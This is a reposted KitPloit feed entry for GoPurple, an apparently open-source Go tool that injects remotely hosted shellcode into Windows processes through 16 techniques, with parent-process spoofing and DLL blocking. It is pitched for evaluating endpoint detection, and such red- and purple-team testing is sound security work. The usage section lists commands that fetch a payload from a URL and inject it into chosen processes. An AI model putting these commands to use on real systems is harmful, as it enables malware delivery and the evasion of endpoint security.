@@ -1,0 +1,262 @@
+Feed: KitPloit - PenTest Tools!
+Title: GoPurple - Yet Another Shellcode Runner Consists Of Different Techniques 
+For Evaluating Detection Capabilities Of Endpoint Security Solutions
+Author: Unknown
+Message-ID: <sd65fq@kitploit.com>
+Date: Sun, 05 Sep 2021 06:30:00 -0500
+Link: http://feedproxy.google.com/~r/PentestTools/~3/HV3PgY89qfw/gopurple-yet-another-shellcode-runner.html
+ 
+[image 1 (link #2)][1]
+ 
+ 
+This project is a simple collection of various shell code injection[3] 
+techniques, aiming to streamline the process of endpoint detection evaluation, 
+beside challenging myself to get into Golang world.
+ 
+ 
+Installation
+ 
+1 - Requires go[4] installed.
+ 
+2 - Build the application from the project's directory: go build. Set 
+GOOS=windows if the build system is not Windows.
+ 
+command line arguments -b string block DLL mode (nonms/onlystore for 
+QueueUserAPC ) -p int Process ID to inject shellcode into -prog string program 
+to inject into -t string shellcode injection technique to use: 1: CreateFiber 2:
+syscall 3: CreateThreadNative 4: CreateProcess 5: EtwpCreateEtwThread 6: 
+CreateRemoteThread 7: RtlCreateUserThread 8: CreateThread 9: 
+CreateRemoteThreadNative 10: CreateProcessWithPipe 11: QueueUserAPC 12: 
+CreateThreadpoolWait 13: BananaPhone 14: EnumerateLoadedModules 15: 
+EnumChildWindows 16: EnumPageFilesW -u string URL hosting the shellcode ">
+  _____ _
+  / ____| | |
+ | | __ ___ _ __ _ _ _ __ _ __ | | ___
+ | | |_ |/ _ \| '_ \| | | | '__| '_ \| |/ _ \
+ | |__| | (_) | |_) | |_| | | | |_) | | __/
+  \_____|\___/| .__/ \__,_|_| | .__/|_|\___|
+              | | | |
+              |_| |_| by @s3cdev
+ 
+ -a string
+        Program command line arguments
+  -b string
+        block DLL mode (nonms/onlystore for QueueUserAPC )
+  -p int
+        Process ID to inject shellcode into
+  -prog string
+        program to inject into
+  -t string
+        shellcode injection technique to use:
+         1: CreateFiber
+         2: syscall
+         3: CreateThreadNative
+         4: CreateProcess
+         5: EtwpCreateEtwThread
+         6: CreateRemoteThread
+         7: RtlCreateUserThread
+         8: CreateThread
+         9: CreateRemoteThreadNative
+         10: CreateProcessWithPipe
+         11: QueueUserAPC
+         12: CreateThreadpoolWait
+         13: BananaPhone
+         14: EnumerateLoadedModules
+         15: EnumChildWindows
+         16: EnumPageFilesW
+  -u string
+        URL hosting the shellcode
+ 
+ 
+ 
+Examples:
+ 
+A shellcode needs to be generated,this can be done using tools such as 
+msfvenom[5] or shad0w[6]. Then the shellcode needs to be hosted to be remotely 
+downloaded and executed on the remote machine. For the sake of clarity, the 
+below demos illustrate different ways of using the tool.
+ 
+1 - Shellcode injection using BananaPhone method + Shad0w as the shellcode 
+generator
+ 
+[image 2 (link #8)][7]
+ 
+ 
+2 - Shellcode injection using QueueUserAPC technique + Shad0w as the shellcode 
+generator[9] + spoofing[10] the parent ID (explorer as the parent ID) + process 
+launching by spoofed parent that contains the shellcode(calc) + protecting the 
+process from unsigned DLL hook, so only Microsoft[11] signed DLL can hook into 
+the process.
+ 
+[image 3 (link #13)][12]
+ 
+ 
+3- Shellcode injection using CreateFiber + msfvenom as the shellcode generator
+ 
+[image 4 (link #2)][1]
+ 
+ 
+How To Use:
+ 
+1 - gopurple.exe -u urlhostingpayload -t 1 (CreateFiber)
+ 
+2 - gopurple.exe -u urlhostingpayload -t 2 (Syscall)
+ 
+3 - gopurple.exe -u urlhostingpayload -t 3 (CreateThreadNative)
+ 
+4 - gopurple.exe -u urlhostingpayload -t 4 (CreateProcess)
+ 
+5 - gopurple.exe -u urlhostingpayload -t 5 (EtwpCreateEtwThread)
+ 
+6 - gopurple.exe -u urlhostingpayload -t 6 -p targetprocess (CreateRemoteThread)
+ 
+7 - gopurple.exe -u urlhostingpayload -t 7 -p targetprocess 
+(RtlCreateUserThread)
+ 
+8 - gopurple.exe -u urlhostingpayload -t 8 (CreateThread)
+ 
+9 - gopurple.exe -u urlhostingpayload -t 9 -p targetprocess 
+(CreateRemoteThreadNative)
+ 
+10 - gopurple.exe -u urlhostingpayload -t 10 -prog porgram -a processargument 
+(ex:C:\Windows\System32\WindowsPowerShell\v1.0) and 
+processargument(ex:Get-Process) (CreateProcessWithPipe)
+ 
+11 - gopurple.exe -u urlhostingpayload -t 11 -p targetpidasparentprocess -prog 
+programtoinjectshellcodeinto -b methodtoblockdll(nonms or onlystore) 
+(QueueUserAPC)
+ 
+nonms = only DLLs that are signed by Microsoft can hook into the process
+ 
+onlystore = only Microsoft store application's process can hook into the process
+ 
+12 - gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWait)
+ 
+13 - gopurple.exe -u urlhostingpayload -t 13 (BananaPhone)
+ 
+14- gopurple.exe -u urlhostingpayload -t 14 (EnumerateLoadedModules)
+ 
+15- gopurple.exe -u urlhostingpayload -t 15 (EnumChildWindows)
+ 
+16- gopurple.exe -u urlhostingpayload -t 16 (EnumPageFilesW)
+ 
+ 
+Acknowledgments:
+ 
+All the credits go to following guys for their awesome researches,tools and 
+inspiration:
+ 
+  * 
+    ne0nd0g[14]: Most of this project has been borrowed from go-shellcode
+  * 
+    spotheplanet[15]: The blogpost[16] inspired me to convert the method to 
+    Golang
+  * 
+    _d00mfist[17]: Great implementation of QueueUserAPC technique in Golang
+  * 
+    c__sto[18]: BananaPhone technique
+  * 
+    batsec[19]: The great shad0w
+  * 
+    chiragsavla94[20]: Inspired from ProcessInjection[21]
+  * 
+    S4R1N[22]: For introducing the new alternative code executions
+ 
+Thanks to brimston3[23] for his support and contribution
+ 
+References
+ 
+(https://github.com/Ne0nd0g/go-shellcode[24])
+ 
+(https://www.ired.team/[25])
+ 
+(https://github.com/D00MFist/Go4aRun[26])
+ 
+(https://github.com/BishopFox/sliver[27])
+ 
+(https://posts.specterops.io/going-4-a-run-eb263838b944[28])
+ 
+(https://github.com/C-Sto/BananaPhone[29])
+ 
+(https://blog.xpnsec.com/protecting-your-malware[30])
+ 
+(https://github.com/3xpl01tc0d3r/ProcessInjection[21])
+ 
+(https://github.com/S4R1N/AlternativeShellcodeExec[31])
+ 
+Future Plans
+ 
+  * Adding more techniques
+  * More structured code
+ 
+ 
+Changelog
+ 
+[1.0.3] - 2021-03-28
+ 
+Added
+ 
+  * EnumPageFilesW technique
+ 
+ 
+[1.0.2] - 2021-03-25
+ 
+Added
+ 
+  * EnumChildWindows technique
+ 
+ 
+[1.0.0] - 2021-03-22
+ 
+Added
+ 
+  * EnumerateLoadedModules technique
+ 
+ 
+Legal Disclaimer
+ 
+This project is made for educational and ethical testing purposes only.Usage of 
+GoPurple for attacking targets without prior mutual consent is illegal. It is 
+the end user's responsibility to obey all applicable local, state and federal 
+laws. Developer assume no liability and are not responsible for any misuse or 
+damage caused by this program
+ 
+ 
+Download GoPurple[32]
+[image 5 (link #33)]
+ 
+Links: 
+[1]: https://1.bp.blogspot.com/-tA-yXXqQJ6E/YSRnbL1wHoI/AAAAAAAAtx4/mp2FV6kVQbQWKx-AT-WxAz6d4w0fl_AqQCNcBGAsYHQ/s1483/GoPurple_3_demo3.gif (link)
+[2]: https://1.bp.blogspot.com/-tA-yXXqQJ6E/YSRnbL1wHoI/AAAAAAAAtx4/mp2FV6kVQbQWKx-AT-WxAz6d4w0fl_AqQCNcBGAsYHQ/w640-h210/GoPurple_3_demo3.gif (image)
+[3]: https://www.kitploit.com/search/label/Injection (link)
+[4]: https://golang.org/dl/ (link)
+[5]: https://www.offensive-security.com/metasploit-unleashed/msfvenom/ (link)
+[6]: https://github.com/bats3c/shad0w (link)
+[7]: https://1.bp.blogspot.com/-kRaMSYZHB5w/YSRnMb-j8zI/AAAAAAAAtxw/Mc-j6YlITNY9NfIjk3j39-fPWZPIDFIXACNcBGAsYHQ/s1579/GoPurple_1_demo1.gif (link)
+[8]: https://1.bp.blogspot.com/-kRaMSYZHB5w/YSRnMb-j8zI/AAAAAAAAtxw/Mc-j6YlITNY9NfIjk3j39-fPWZPIDFIXACNcBGAsYHQ/w640-h230/GoPurple_1_demo1.gif (image)
+[9]: https://www.kitploit.com/search/label/Generator (link)
+[10]: https://www.kitploit.com/search/label/Spoofing (link)
+[11]: https://www.kitploit.com/search/label/Microsoft (link)
+[12]: https://1.bp.blogspot.com/-wR6NZSTHFt8/YSRnS0vtLEI/AAAAAAAAtx0/-PmKceoJYWskXubg2lLzc2wXJeJqCCcqQCNcBGAsYHQ/s1497/GoPurple_2_demo2.gif (link)
+[13]: https://1.bp.blogspot.com/-wR6NZSTHFt8/YSRnS0vtLEI/AAAAAAAAtx0/-PmKceoJYWskXubg2lLzc2wXJeJqCCcqQCNcBGAsYHQ/w640-h242/GoPurple_2_demo2.gif (image)
+[14]: https://twitter.com/ne0nd0g (link)
+[15]: https://twitter.com/spotheplanet (link)
+[16]: https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait (link)
+[17]: https://twitter.com/_d00mfist (link)
+[18]: https://twitter.com/c__sto (link)
+[19]: https://twitter.com/_batsec_ (link)
+[20]: https://twitter.com/chiragsavla94 (link)
+[21]: https://github.com/3xpl01tc0d3r/ProcessInjection (link)
+[22]: https://twitter.com/S4R1N (link)
+[23]: https://twitter.com/brimston3 (link)
+[24]: https://github.com/Ne0nd0g/go-shellcode (link)
+[25]: https://www.ired.team/ (link)
+[26]: https://github.com/D00MFist/Go4aRun (link)
+[27]: https://github.com/BishopFox/sliver (link)
+[28]: https://posts.specterops.io/going-4-a-run-eb263838b944 (link)
+[29]: https://github.com/C-Sto/BananaPhone (link)
+[30]: https://blog.xpnsec.com/protecting-your-malware (link)
+[31]: https://github.com/S4R1N/AlternativeShellcodeExec (link)
+[32]: https://github.com/sh4hin/GoPurple (link)
+[33]: http://feeds.feedburner.com/~r/PentestTools/~4/HV3PgY89qfw (image)
+
